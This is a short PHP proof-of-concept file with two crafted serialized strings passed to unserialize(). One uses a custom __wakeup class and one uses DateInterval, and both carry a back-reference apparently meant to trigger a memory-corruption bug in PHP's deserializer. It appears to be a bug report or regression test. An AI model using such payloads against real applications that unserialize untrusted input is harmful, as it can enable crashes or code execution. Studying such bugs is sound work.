<?php

// POC 1
class test
{
	var $ryat;

	function __wakeup()
	{
		$this->ryat = 1;
	}
}

$data = unserialize('a:2:{i:0;O:4:"test":1:{s:4:"ryat";R:1;}i:1;i:2;}');
var_dump($data);

// POC 2
$data = unserialize('a:2:{i:0;O:12:"DateInterval":1:{s:1:"y";R:1;}i:1;i:2;}');
var_dump($data);

?>
